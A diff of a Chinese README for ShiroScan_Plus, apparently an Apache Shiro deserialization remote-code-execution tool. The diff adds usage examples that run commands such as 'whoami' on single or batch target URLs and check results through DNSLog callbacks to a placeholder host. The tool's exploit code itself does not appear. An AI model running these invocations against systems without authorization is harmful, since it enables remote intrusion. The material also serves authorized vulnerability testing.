@@ -8,7 +8,7 @@ ShiroScan_Plus是基于sv3nbeast/ShiroScan改进的增强版的Shiro反序列化
 
 ## 新改动内容
 1. 更正requirements.txt，优化代码规范和逻辑问题。 
-2. 用[**Koalr**](https://github.com/zema1) 的带回显利用链 
+2. 用[**Koalr**](https://github.com/zema1) 的利用链 
    CommonsCollectionsK1到K4替代CommonsCollections1到7
 3. 为了Windows用户方便安装pycrypto，requirements.txt中添加了pycryptodome==3.9.8
 4. 增加参数解析，增加DNSLog验证、URL文件批量处理、输出到文件等功能，多个功能可以配合使用。   
@@ -22,30 +22,48 @@ ShiroScan_Plus是基于sv3nbeast/ShiroScan改进的增强版的Shiro反序列化
 ## 使用方法  
 **运行环境为Python3**
 ```
-* pip install -r requirments.txt  
-* Usage：python3 shiro_rce_plus.py -u url -c command   
-* Example：python3 shiro_rce_plus.py -u https://url.com -c "whoami"  
-```  
+* 安装依赖：pip install -r requirments.txt  
+* 获取帮助：python3 shiro_rce_plus.py --help
+```
 
 ```
-* Usage：python3 shiro_rce_plus.py --help  
+* 使用示例     
+* Example：python3 shiro_rce_plus.py -u https://url.com -c "whoami"
+* Example: Python3 shiro_rce_plug.py -f urls.txt -c "whoami"
+* Example: Python3 shiro_rce_plug.py -v -f urls.txt --dnslog "{randstr}.testdnslog.com"  
+            --check_dnslog "http://check.testdnslog.com/{randstr}"  --flag "True"  
+            --output res.txt
+```  
+
+## 帮助信息
+```
+* python3 shiro_rce_plus.py --help  
   
-usage: shiro_rce_plus.py [-h] [-u URL] [-f FILE] [-c COMMAND]  
-                         [-v] [--output OUTPUT] [--dnslog DNSLOG]  
-                         [--flag FLAG] [--check_dnslog CHECK_DNSLOG]  
-  
-optional arguments:  
-  -h, --help            show this help message and exit  
-  -u URL, --url URL     待检测单个URL  
-  -f FILE, --file FILE  待检测URL文件  
-  -c COMMAND, --command COMMAND  
-                        要执行的命令  
-  -v, --verify          使用DNSLog验证  
-  --output OUTPUT       输出到文件，文件不存在会自动创建。  
-  --dnslog DNSLOG       包含{randstr}的字符串，会自动format  
-  --flag FLAG           Dnslog检查页面包含的关键词  
+
+ ____  _     _          ____                  ____  _
+/ ___|| |__ (_)_ __ ___/ ___|  ___ __ _ _ __ |  _ \| |_   _ ___
+\___ \| '_ \| | '__/ _ \___ \ / __/ _` | '_ \| |_) | | | | / __|
+ ___) | | | | | | | (_) |__) | (_| (_| | | | |  __/| | |_| \__ \
+|____/|_| |_|_|_|  \___/____/ \___\__,_|_| |_|_|   |_|\__,_|___/
+
+                           原作者： 斯文
+                           修改：  Hack3rHan
+
+usage: shiro_rce_plus.py [-h] [-u URL] [-f FILE] [-c COMMAND] [-v] [--output OUTPUT] [--dnslog DNSLOG]
+                         [--flag FLAG] [--check_dnslog CHECK_DNSLOG]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -u URL, --url URL     待检测单个URL。
+  -f FILE, --file FILE  待检测URL文件，换行分割。
+  -c COMMAND, --command COMMAND
+                        要执行的命令。
+  -v, --verify          使用DNSLog验证。
+  --output OUTPUT       输出到文件，文件不存在会自动创建。
+  --dnslog DNSLOG       包含{randstr}的字符串，randstr会被format。
+  --flag FLAG           DNSlog检查页面包含的关键词。
   --check_dnslog CHECK_DNSLOG
-                        包含{randstr}的字符串，会自动format  
+                        包含{randstr}的字符串，randstr会被format。
 
 
 ```
